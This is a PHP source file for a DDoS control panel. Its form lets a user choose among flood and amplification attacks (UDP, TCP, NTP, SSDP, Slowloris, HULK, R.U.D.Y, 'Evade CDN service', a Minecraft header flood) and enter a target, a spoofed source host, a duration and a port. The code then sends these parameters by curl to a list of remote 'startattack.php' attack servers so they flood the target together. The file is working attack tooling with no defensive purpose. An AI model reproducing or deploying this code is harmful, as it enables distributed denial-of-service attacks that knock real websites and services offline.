<?php
?>
<form name="input" id="form" action="index.php?page=ddos" method="POST"> 
	<select name="method" id="select" class="inputs" onchange="Check(this);" required>
		<option  selected disabled selected value> -- select a Method -- </option>
		<optgroup label="Layer 3:">
			<option value="icmp">ICMP</option>
			<!--<option value="smurf">ICMP SMURF</option>-->
		<optgroup label="Layer 4:">
		  <option value="udp">UDP Flood</option>
		  <option value="tcp">TCP Flood</option>
		  <option value="ntpattack">NTP Attack(DNS Attack)</option>
		  <option value="ssdpattack">SSDP Attack</option>

		<optgroup label="Layer 7 - for websites:">
			<option value="post">POST Flood</option>
			<option value="get">GET Flood</option>
			<option value="ssl">SSL Flood</option>
		  	<option value="toxicssl">Toxic SSL Flood</option>
			<option value="404">Evade CDN service</option>
			<option value="slowloris">Slowloris Attack</option>
			<option value="arme">ARME Attack</option>
			<option value="hulk">HULK Attack</option>
			<option value="rudy">R.U.D.Y Attack</option>

		<optgroup label="Layer 7 - for Minecraft:">
			<option value="minecraftbandwitdh">Header Flood</option>
	</select>
	<div><input class="inputs main" type="text" name="ip" size="15" maxlength="150"  placeholder="Target" value = "" id="sinput1" style="display: none;"></div>
	<div><input class="inputs main" type="text" name="srcip" size="15" maxlength="150"  placeholder="Source HOST" value = "" id="sinput1_2" style="display: none;"></div>
	<div><input class="inputs main" type="number" name="time" size="14" maxlength="20"  placeholder="Time (in seconds)" value = "" id="sinput2" style="display: none;"></div>
	<div><input class="inputs main" type="number" name="port" size="5" maxlength="5"  placeholder="Port" value = "" style="display: none;" id="sinput3"></div>
	<div><input class="inputs main" type="number" name="timedout" size="5" maxlength="5"  placeholder="Timedout (default: 30)" value = "30" style="display: none;" id="sinput5"></div>
	<div><input class="inputs main" type="number" name="builds" size="15" maxlength="150"  placeholder="Build socket" value = "100" id="sinput6" style="display: none;"></div>
	<textarea name="panels" class="inputs" id="textarea" placeholder="<?php echo 'http://'.$serverip.'/php/startattack.php, http://example/php/startattack.php,';?>"></textarea>
	<div><input class="start-btn" type="submit" value="Start the Attack"></div>
</form>
<?php
if(isset($_POST['method'])){
	if(!empty($_POST['builds'])){
		$socketn = $_POST['builds'];
	}else{$socketn = 100;}
	//Message length
	if(!empty($_POST['lenght'])){
		$lenght = $_POST['lenght'];
	}else{$lenght = 1024;}
	//timeout
	if(!empty($_POST['timedout'])){
		$timedout = $_POST['timedout'];
	}else{$timedout = 30;}
	//Host
	if(!empty($_POST['ip'])){
		$ip = $_POST['ip'];
	}else{
		echo "host is empty!";
		//break;
	}
	//Source IP
	if(!empty($_POST['srcip'])){
		$srcip = $_POST['srcip'];
	}else{$srcip = "localhost";}
	//Method
	if(!empty($_POST['method'])){
		$method = $_POST['method'];  
	}else{
		echo "method is empty!";
		//break;
	}
	//Port
	if(!empty($_POST['port'])){
		$port = $_POST['port']; 
	}else{$port = 80;}
	//Exec Time
	if(!empty($_POST['time'])){
		$exec_time = $_POST['time'];  
	}else{
		echo "exec_time is empty!";
		//break;
	}
	//Panels
	if(!empty($_POST['panels'])){
		$panel = $_POST['panels']; 
		$panels = explode(", ", $panel); 
	}else{
		echo "panels is empty!";
		//break;
	}
	$max_time = time()+$exec_time;


	ignore_user_abort(FALSE); 
	ini_set('max_execution_time', $max_time);
	$data = "builds=".$socketn."&lenght=".$lenght."&timedout=".$timedout."&ip=".$ip."&srcip=".$srcip."&method=".$method."&port=".$port."&time=".$exec_time;
	for($i = 0; $i <= sizeof($panels)-1; $i++){
		$curl[$i] = curl_init($panels[$i]);
    	curl_setopt($curl[$i], CURLOPT_POST, true);
    	curl_setopt($curl[$i], CURLOPT_POSTFIELDS, $data);
    	curl_setopt($curl[$i], CURLOPT_RETURNTRANSFER, true);
    	$response[$i] = curl_exec($curl[$i]);
    	curl_close($curl[$i]);
    	echo $panels[$i] . ": <br>".$response[$i] ."<br><br>";
	}
}

?>
